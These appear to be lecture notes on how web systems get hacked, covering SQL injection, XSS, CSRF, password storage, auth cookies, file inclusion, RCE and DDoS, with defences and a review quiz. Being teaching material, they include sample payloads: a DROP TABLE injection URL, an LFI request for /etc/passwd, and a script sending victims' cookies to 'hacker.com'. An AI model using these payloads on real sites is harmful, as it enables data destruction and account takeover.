Web Security: How Systems Get Hacked

Why web security is hard, what "getting hacked" actually means for servers and for users, and the vulnerabilities that cause most breaches — SQL injection, cross-site scripting, CSRF, broken authentication, file inclusion, remote code execution and denial of service — together with the defences that actually work.

Read this first: Security is a resource game you cannot win outright. Every vulnerability in this lecture is one of two things: user input that is trusted when it should be sanitised (SQLi, XSS, LFI/RFI, RCE) or a request that is authenticated when it should not be believed (CSRF, stolen cookies). Learn to spot untrusted input and unverified identity, and you can reason about almost any web exploit.

Getting Hacked: How and What

Sites get hacked because designers protect the wrong things, protect the right things the wrong way, or misunderstand their own system.

Why do sites get hacked? Because system designers:

  • Protect the wrong things.
  • Protect the right things in the wrong way.
  • Make poor assumptions about their systems.
  • Fail to understand the threat model.
  • Fail to account for paradigm shifts (e.g. the internet).
  • Fail to understand the scope of their system.

Web security is hard

"Modern web applications are built on a tangle of technologies that have been developed over time and then haphazardly pieced together. Every piece of the web application stack, from HTTP requests to browser-side scripts, comes with important yet subtle security consequences." — Michal Zalewski, The Tangled Web

What does it mean to get hacked?

Servers

  • The most obvious attack: compromise the servers running the site.
  • Done through manipulation of server-side code.
  • Examples: SQL Injection, Remote Code Execution, Local/Remote File Inclusion.

Users

  • A less obvious attack: attack the users while they use the site as intended.
  • Done by altering or intercepting data on the user's computer.
  • Examples: Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF).

What can be hacked?

A product or component (a program, protocol, smart card)… plus infrastructure (PC, OS, communications)… plus applications (web server, payroll)… plus IT staff… plus users and management… plus customers and external users… plus partners and vendors.

⚠️
Common trap: Security is not just about code. People are part of the system, and it is a lot easier to break a system than to make it secure.
🤔
Pause & predict: a site has flawless server code. Name two non-code parts of "the system" an attacker could still go after.

Axioms of Information Security and Focusing on Risk

Security is a resource game, all systems are buggy, and you must spend your effort where risk is greatest.

Axioms of information security

  1. Information security is a resource game.
  2. All systems are buggy.
  3. The bigger the system, the buggier it is.
  4. Nothing works in isolation.
  5. Humans are most often the weakest link in a system.
  6. It is a lot easier to break a system than to make it secure.

Focus on the important risks

Risk levels run from severe (must be managed by senior management with a detailed plan), through high, major, significant, moderate and low, down to trivial (unlikely to need specific resources).

Finding the right balance means weighing three things:

🎯 Likelihood

How likely is the component to be exploited?

💥 Damage

How much damage occurs if it is exploited?

💸 Mitigation cost

What does it cost to prevent the exploitation?

💡
Why it matters: You cannot fix everything, and trying to is itself a risk — over-engineering costs time and introduces bugs. Prioritising by likelihood × damage ÷ cost is how professionals decide where to spend effort.
🤔
Pause & predict: two bugs: one is very likely but low-damage, the other unlikely but catastrophic. Which do you fix first, and what else do you weigh?

Resources on security

  • A sound knowledge of these tools opens plenty of commercial opportunities.
  • This can be a rewarding career — do not throw it away doing something stupid.

SQL Injection

SQL injection happens when unsanitised user input is pasted into a database query, letting the attacker rewrite that query.

SQL Injection arises from failing to properly sanitise user input before inserting it into a database string. If the input can be used to modify an SQL query, it is possible to modify it to do any database query.

  • Very common.
  • Can lead to complete compromise.
  • Many automated tools exist to detect it — and many to exploit it.
  • Using an ORM or a database library can defend against it.

A vulnerable example

// Get input
$id = $_REQUEST['id'];

// Check database
$query = "SELECT first_name, last_name FROM users
WHERE user_id = '$id';";
$result = mysql_query($query);

Visiting http://example.com/?id=15 behaves normally and returns user 15. But visiting http://example.com/?id=%27%3B+DROP+TABLE+users%3B+-- makes the query that actually runs:

SELECT first_name, last_name FROM users WHERE user_id = ''; DROP TABLE users; --';

The quote closes the string, the ; ends the statement, and -- comments out the rest.

Automation: sqlmap

Performing an SQL injection has now been automated. sqlmap, written in Python and fully open source, does most of the hard work for the attacker.

⚠️
Common trap: Never build SQL by string-concatenating user input. Use an ORM, or parameterised/prepared statements, so input is data and never code.
🤔

Cross-Site Scripting (XSS)

XSS occurs when an attacker can inject HTML into a page — and since HTML can carry JavaScript, that means arbitrary code in the victim's browser.

Cross-Site Scripting arises when an attacker is able to inject HTML into the website. Remember: HTML tells the browser how to display a page and can incorporate JavaScript.

A simple example

Imagine a template that inserts the user's name into a heading:

<H1>Hello {% user.name %}</H1>

This works fine for regular users — until a user's name is:

<script>alert("LOL");</script>

The page then renders this snippet, which runs the script when that user loads the page:

<H1>Hello <script>alert("LOL");</script></H1>

In this case only that user sees the alert. But if the snippet appears on a public page (a list of users, a blog post showing an author's name) and is more malicious than a simple alert, the effects can be devastating.

💡
Why it matters: XSS is not "just a popup". Injected JavaScript runs with the full trust of your site, in the victim's browser, where their cookies and session live.

Stealing Cookies and Preventing XSS

The classic XSS payload steals the victim's cookie; the only robust defence is context-aware HTML escaping on output.

Why injected JavaScript is dangerous: stealing cookies

What can a hacker do by executing JavaScript in your browser? Steal your cookies. An injected script like:

document.write('<img src="http://hacker.com/collect.php?cookie='
  + document.cookie + '" />')

sends the cookie for any user who loads the page to the attacker's server. With a user's cookie, the attacker can authenticate as that user.

Preventing XSS

A tempting approach is to strip all <script> tags from user input. This is wrong. Input like <s<script>cript>…</script> becomes <script>…</script> after the inner tag is removed. There are many ways to perform XSS, and it is impossible to recognise them all — for example, an image tag:

<img src="img.jpg" onerror="alert(1)" />

The best way to stop XSS is HTML escaping via your templating library:

  1. User input is stored in the database as-is, even if it includes HTML tags.
  2. Upon displaying any data, it is HTML escaped by default.

So the name <script>alert("LOL");</script> is displayed as:

<H1>Hello &lt;script&gt;alert(&quot;LOL&quot;);&lt;/script&gt;</H1>

This prints the HTML to the screen — it is not interpreted as actual HTML and rendered by the browser.

🧠
Memory hook: Store raw, escape on output. Escaping at the output stage is the one place where you know the context and can do it correctly.
⚠️
Common trap: Blocklist filtering (removing <script>) always loses. Escaping/encoding is a whitelist-style transformation that neutralises the meaning of the characters instead of guessing at attacks.

Cross-Site Request Forgery (CSRF)

CSRF exploits the gap between the browser being authenticated and the request itself being authenticated.

Cross-Site Request Forgery (CSRF) is a type of exploit against a website. CSRF arises when only the browser is authenticated (e.g. via a cookie), but the user's request is not properly authenticated.

Preventing CSRF

Typically we prevent CSRF by including a CSRF token when making requests that change data (e.g. POST, but not GET). When submitting requests to the server, the website can use JavaScript to also submit a special token from a cookie as one of the POST request variables — a token only it has access to.

  • The CSRF token typically appears somewhere in the HTML or in the cookies.
  • Checking for the presence of a CSRF token in the cookie is not enough — it must be included as a variable that authenticates the request.
⚠️
Common trap: Cookies are sent automatically by the browser on every request. That automatic sending is exactly what makes CSRF possible — the attacker does not need to read the cookie, only to make the browser use it.
🤔
Pause & predict: why does a CSRF token need to be a request variable and not merely a cookie that the browser sends automatically?

Authentication and Password Storage

Authentication has two stages — logging in, then identifying the logged-in session — and passwords must be stored as hashes, never plaintext.

We can consider authentication to occur in two stages:

  1. Logging in — e.g. username and password.
  2. Identifying the logged-in session — e.g. cookies.

How logging in works

  1. The user sees the login form and provides a username and password.
  2. The server hashes the password and compares the computed hash with its stored password hash for that user.
  3. If the hashes match, the user is authenticated and the server responds with an authentication cookie/token.

Password storage

If passwords were stored in plaintext, an attacker who gained access to the database could authenticate as anyone. So we store password hashes, meaning that if the database is breached, the attacker cannot use the information as-is — they would need to reverse the hash to recover the original passwords.

💡
Why it matters: A hash means a database breach does not immediately become an account-takeover. It buys you time and limits blast radius — but only if the hashes are strong and salted.

Hash Functions and Cracking Passwords

A good hash is one-way, unpredictable and collision-resistant — yet weak human passwords can still be cracked by precomputation.

Hash functions: desirable properties

Hash functions map an input string to an output hash. They should be:

➡️ One way

Given a hash, the original string cannot be computed.

🎲 Unpredictable

You cannot choose an input string that produces a particular output hash.

🚫 Non-collision

You cannot find two input strings that map to the same output hash.

Cracking passwords

To reverse hashes obtained from a database, an attacker can theoretically compute the hash of all possible passwords and match them against the stolen list. This works because:

  • Passwords are hard to make up and remember — most human-generated passwords appear in a dictionary, as a word or a concatenation of words.
  • A major extension of this attack is rainbow tables: lists of commonly used passwords (password1, ilikecats123, …) used to supplement dictionary attacks.

These attacks will not work on every user (a unique gibberish password resists them), but they have been shown to work on large portions of leaked password-hash sets.

🧠
Memory hook: Hashing makes the attack slow but not impossible. Attackers shortcut it with precomputation — which is exactly what salting breaks.

Salting Passwords

A salt is extra random data concatenated before hashing, which makes large-scale precomputation useless.

To mitigate the effects of a dictionary attack without forcing stricter password requirements on users, passwords can instead be salted. Before being fed into the hash function, the raw password is concatenated with another string — the salt.

  • Salts are usually stored in plaintext in the database, right next to the password hashes.
  • For further security, a different salt can be used for each user.
  • This thwarts dictionary attacks that rely on massive precomputation — the attacker cannot reuse one precomputed table across users.
⚠️
Common trap: Salting is not a silver bullet. Once the salt is known, brute-force dictionary attacks may still be run against an individual hash — salting raises the cost dramatically, it does not make cracking impossible.
🤔
Pause & predict: why does giving every user a different salt prevent an attacker from reusing one giant precomputed rainbow table?

Authentication Cookies and Calculated Tokens

After login the server issues an auth token in a cookie; it can manage that token statefully in a database or statelessly by recomputing it.

Once a user has provided their password and been authenticated, they are given an auth token, which is provided in the cookies. There are two main ways to manage it:

Stateful

  • Store valid tokens and their expiry in a database (e.g. Redis).
  • Straightforward to reason about and easy to revoke.
  • Requires a lookup on every request.

Stateless

  • Calculate valid tokens using a hash of details plus a secret.
  • No token store needed; recomputed on each request.
  • Harder to revoke individual tokens.

Calculated authentication tokens

Calculated tokens let the server check whether a user is authenticated without storing tokens. A value is computed that can be re-computed after every request, and the server checks whether the provided token matches the freshly calculated one.

This adds computational overhead (the token is recomputed for every request) but reduces memory overhead (nothing stored).

def build_auth_token(self):
    max_validity_duration_seconds = 21600  # 6 hours
    timestamp = int(datetime.datetime.utcnow().strftime("%s"))
    validity_timestamp = int(timestamp - (timestamp % max_validity_duration_seconds))
    auth_token = hashlib.sha512(
        self.secret_key[0] +
        str(validity_timestamp) +
        str(self.id) +
        self.secret_key[1]
    )
    return auth_token.hexdigest()

def validate_auth_token(self, token):
    return self.build_auth_token() == token

The validity timestamp is rounded down to a 6-hour window, so the recomputed token changes every six hours.

🧠
Memory hook: Stateful = look it up (memory cost). Stateless = recompute and compare (CPU cost). Same security goal, different resource trade-off.

Storing and Sending Cookies Safely

The auth token in a cookie is the user's identity, so it must be protected in transit and from scripts.

Some tips for storing and managing cookies:

  1. Always access the website over HTTPS. This prevents network MITM attacks from sniffing auth cookies.
  2. Set the cookie's Secure attribute. This ensures the cookie is only sent when connecting via HTTPS.
  3. Set the cookie's HttpOnly attribute. This ensures scripts on the page cannot read the cookie (e.g. via XSS) and that cookies are only sent with HTTP(S) requests.
💡
Why it matters: The auth token is the user's identity. Steal it and you become them. Secure blocks network sniffing; HttpOnly blocks the XSS cookie-theft attack you saw earlier.
ℹ️
Note: These attributes compose with the earlier defences. XSS escaping prevents injection; HttpOnly limits the damage if injection still succeeds; HTTPS protects the token in transit.

File Inclusion, RCE and DDoS

Tricking an app into loading a file can leak data or run code; a traffic flood can take the whole site offline.

Local/Remote File Inclusion (LFI/RFI)

File inclusion is a vulnerability where the web application is manipulated into loading an unexpected file. This can be used to obtain the contents of a file or to dynamically change the program's behaviour.

$page = $_GET["page"];
include($page);

Simply visiting http://example.com/index.php?page=/etc/passwd outputs the /etc/passwd file if the app is not configured correctly. This looks obvious, yet it is a very common bug.

  • Local = files already on the server, as above.
  • Remote = get the server to load a file from a remote location.
  • Defence: do not allow user parameters to govern what files can be included.

Remote Code Execution (RCE)

Remote/Arbitrary Code Execution is a vulnerability where an attacker can provide code that will be run on the remote server. It is considered the worst type of exploit, as it quickly leads to full server compromise.

The most common culprits:

  • The eval() function (or equivalent).
  • PHP unserialize().
  • Regular expressions with the e flag.

A simple example from the OWASP Code Injection page:

$myvar = "varname";
$x = $_GET['arg'];
eval("\$myvar = \$x;");

Distributed Denial of Service (DDoS)

Denial-of-service attacks prevent anyone from accessing a particular website. Typically this is done by flooding the site with a very large amount of traffic, so legitimate requests cannot be processed.

Defence is very difficult — detection mechanisms can introduce a large amount of overhead for legitimate requests. The only real way to defend your system is to absorb the attack traffic.

⚠️
Common trap: Never let user input decide a file path, a command, or code that gets evaluated. LFI/RFI and RCE are all "input became control" bugs.
🤔
Pause & predict: LFI, RFI and RCE all share a root cause. What is it, in one sentence?

Case Studies: When Checks Fail

Real systems have shipped with empty passwords, default accounts and no password check at all — these failures are more common than you would think.

Empty password

How many sites, services or operating systems have allowed login when an empty password is submitted for a user?

  • Apple/macOS High Sierra (2017) — a macOS bug let you log in as admin with no password.
  • Valve/Steam (2015).
  • Linux-PAM < 1.5.1 — CVE-2020-27780.

Default account with empty password

How many have shipped default accounts with empty passwords, allowing anyone to log in?

  • Western Digital My Cloud (2019) — CVE-2019-9950.
  • Microsoft SQL Server (2000) — CVE-2000-1209.
  • D-Link (2020) — CVE-2020-8864.

No password check at all

How many have allowed login without checking the password at all?

  • IRC5 (2020) — CVE-2020-10288.
  • Eclipse Mosquitto (2018) — CVE-2018-12551.
  • Keycloak (2019) — CVE-2019-14909.

Other notable cases

  • Dropbox security bug — passwords became optional for four hours.
  • vBulletin — CVE-2015-7808, exploited in Metasploit.
  • The MySpace "Sammy" worm.
  • The GitHub DDoS.
  • "The Annoying Site".
💡
Why it matters: These are not exotic attacks. They are plain authentication logic failures — and they affected major vendors. A single unguarded branch in a login check can defeat every other control.

Glossary

Every term you need to speak this week's language.

Threat model
A description of what you are defending against; failing to understand it is a common reason systems get hacked.
Risk prioritisation
Balancing likelihood of exploitation, damage if exploited, and mitigation cost to decide what to fix first.
SQL Injection (SQLi)
Failing to sanitise user input before it is inserted into a database query, allowing the query to be rewritten.
sqlmap
An open-source Python tool that automates SQL injection.

Injecting HTML (and therefore JavaScript) into a website, which then runs in victims' browsers.
HTML escaping
Encoding characters so injected markup is displayed as text rather than interpreted; the correct XSS defence.
Cross-Site Request Forgery (CSRF)
An exploit where the browser is authenticated but the user's request is not properly authenticated.
CSRF token
A special token submitted as a request variable on state-changing requests to authenticate them.
Authentication
Two stages: logging in (username/password) and identifying the logged-in session (cookie/token).
Password hash
The stored, irreversible representation of a password, compared against a freshly computed hash at login.
Hash function
A function mapping input to output that should be one-way, unpredictable and collision-resistant.
Dictionary attack
Trying common words and combinations to reverse password hashes.
Rainbow table
A precomputed list of common passwords and their hashes used to speed up cracking.
Salt
Random data concatenated with a password before hashing; stored in plaintext, ideally unique per user, to defeat precomputation.

The value issued after login (usually in a cookie) that identifies the user's session on later requests.

A valid token stored with its expiry in a database (e.g. Redis) and looked up per request.
Stateless token
A token recalculated from details plus a secret on each request, needing no token store.

An in-memory store commonly used to hold valid auth tokens and expiry statefully.
Secure attribute
A cookie flag ensuring the cookie is only sent over HTTPS.
HttpOnly attribute
A cookie flag preventing client-side scripts from reading the cookie, mitigating XSS cookie theft.
Local/Remote File Inclusion
Manipulating an app into loading an unexpected file, locally (on the server) or remotely (from elsewhere).
Remote Code Execution (RCE)
Attacker-supplied code running on the remote server; the worst exploit, often via eval, unserialize or a regex e flag.
Denial of Service (DDoS)
Flooding a site with traffic so legitimate requests cannot be processed; only really defended by absorbing traffic.

The Open Web Application Security Project — assessment and education resources, including the Top 10.
CVE
Common Vulnerabilities and Exposures — a public system tracking known breaches and leaks (160,000+ incidents).
DVWA
Damn Vulnerable Web Application — a deliberately vulnerable app for practising basic web exploits.
PentesterLab
Practical tutorials and exercises for learning hacking and penetration-testing skills.
MITM attack
A man-in-the-middle attack that intercepts traffic; HTTPS prevents it from sniffing auth cookies.

List six reasons system designers allow their systems to be hacked, and distinguish server-side from user-side attacks.

Q4

List the eight OWASP-class vulnerabilities covered and describe each in one line.

Config — insecure configurations. LFI/RFI — app tricked into loading unexpected files. RCE — attacker code runs on the server. DDoS — traffic flood prevents access.
Q5

What causes SQL injection, how does the DROP TABLE example work, and how is it prevented?

Answer: It arises from failing to sanitise user input before inserting it into a database string, so the input can modify the query. In the example, the request id=%27%3B+DROP+TABLE+users%3B+-- produces the query: SELECT first_name, last_name FROM users WHERE user_id = ''; DROP TABLE users; --'; — the quote closes the string, the semicolon ends the statement and -- comments out the rest. Defence: use an ORM or a database library (parameterised queries). sqlmap automates the attack.
Q6

What is XSS, and why can executing JavaScript in a victim's browser be devastating?

Answer: XSS arises when an attacker can inject HTML into the website; HTML can incorporate JavaScript. If injected JavaScript runs in a victim's browser it can steal cookies — e.g. document.write('<img src="http://hacker.com/collect.php?cookie=' + document.cookie + '" />') sends the cookie to the attacker's server. With the cookie the attacker can authenticate as that user. On a public page, the effects can be devastating.
Q7

Why is stripping <script> tags the wrong way to prevent XSS, and what is the right way?

Answer: It fails because attackers can obfuscate: <s<script>cript>…</script> becomes <script>…</script> after the inner tag is stripped. There are also many non-script vectors, e.g. <img src="img.jpg" onerror="alert(1)" />, and it is impossible to recognise them all. The right way is HTML escaping with the templating library: store user input as-is in the database, then HTML-escape all data upon display so it is shown as text rather than interpreted.
Q8

Explain CSRF and how a CSRF token prevents it.

Answer: CSRF arises when only the browser is authenticated (e.g. via a cookie) but the user's request is not properly authenticated. It is prevented by including a CSRF token on requests that change data (e.g. POST, not GET). JavaScript submits a special token from a cookie as one of the POST variables — only the site has access to it. The token typically appears in the HTML or cookies; checking only for its presence in a cookie is not enough — it must be included as a variable that authenticates the request.
Q9

Describe the two stages of authentication and the three steps of a login.

Answer: The two stages are logging in (username/password) and identifying the logged-in session (cookies). Login steps: 1) the user sees the login form and provides a username and password; 2) the server hashes the password and compares it with its stored password hash; 3) if the hashes match, the user is authenticated and the server responds with an authentication cookie/token.
Q10

Explain password hashing, dictionary attacks and rainbow tables, and how salting helps.

Answer: Passwords are stored as hashes so a database breach cannot be used as-is; the attacker would need to reverse the hash. Hash functions should be one-way, unpredictable and collision-resistant. To reverse hashes, an attacker can compute the hash of all possible passwords and match them: most human passwords appear in a dictionary as words or concatenations. Rainbow tables are lists of commonly used passwords supplementing dictionary attacks. Salting concatenates a random string with the password before hashing; salts are stored in plaintext beside the hash and ideally are unique per user. This thwarts precomputation, though once the salt is known a brute-force dictionary attack is still possible.
Q11

Contrast stateful and stateless auth tokens, and explain how a calculated token works and its trade-off.

Answer: Stateful: store valid tokens and expiry in a database (e.g. Redis) — obvious and easy to revoke. Stateless: calculate valid tokens using a hash of details plus a secret, so no store is needed. Calculated auth tokens let the server check authentication without storing tokens: a value is computed and recomputed after every request, then compared with the provided token. Trade-off: added computational overhead (recomputed each request) but reduced memory overhead. In the example, a timestamp is rounded down to a 6-hour window (21600s) and hashed with secrets and the user id.
Q12

Give three tips for storing and sending cookies, and say what each protects against.

Answer: 1) Always access the site over HTTPS — prevents network MITM attacks from sniffing auth cookies. 2) Set the cookie's Secure attribute — ensures the cookie is only sent over HTTPS. 3) Set the cookie's HttpOnly attribute — ensures scripts on the page cannot read the cookie (e.g. via XSS) and that cookies are only sent with HTTP(S) requests.
Q13

Explain LFI/RFI and RCE, including the common RCE culprits and the defence for file inclusion.

Answer: LFI/RFI is a vulnerability where the web application is manipulated into loading an unexpected file, used to obtain file contents or change program behaviour. Example: $page = $_GET["page"]; include($page); then visiting ?page=/etc/passwd outputs that file. Local = files already on the server; remote = loading a file from a remote location. Defence: do not allow user parameters to govern what files can be included. RCE is where an attacker provides code run on the server — the worst exploit, leading quickly to full compromise. Common culprits: eval() (or equivalent), PHP unserialize(), and regular expressions with the e flag. Example: eval("\$myvar = \$x;").
Q14

Explain DDoS defence and summarise the three classes of authentication failure in the case studies.

Answer: DDoS floods a site with traffic so legitimate requests cannot be processed; defence is very difficult because detection adds overhead for legitimate traffic. The only real defence is to absorb the attack traffic. Case-study classes: (1) empty password accepted — macOS High Sierra 2017 (admin with no password), Valve/Steam 2015, Linux-PAM CVE-2020-27780; (2) default account with empty password — Western Digital My Cloud CVE-2019-9950, Microsoft SQL Server 2000 CVE-2000-1209, D-Link CVE-2020-8864; (3) no password check at all — IRC5 CVE-2020-10288, Eclipse Mosquitto CVE-2018-12551, Keycloak CVE-2019-14909. Other cases: Dropbox (passwords optional for four hours), vBulletin CVE-2015-7808, the MySpace Sammy worm, the GitHub DDoS, "The Annoying Site".
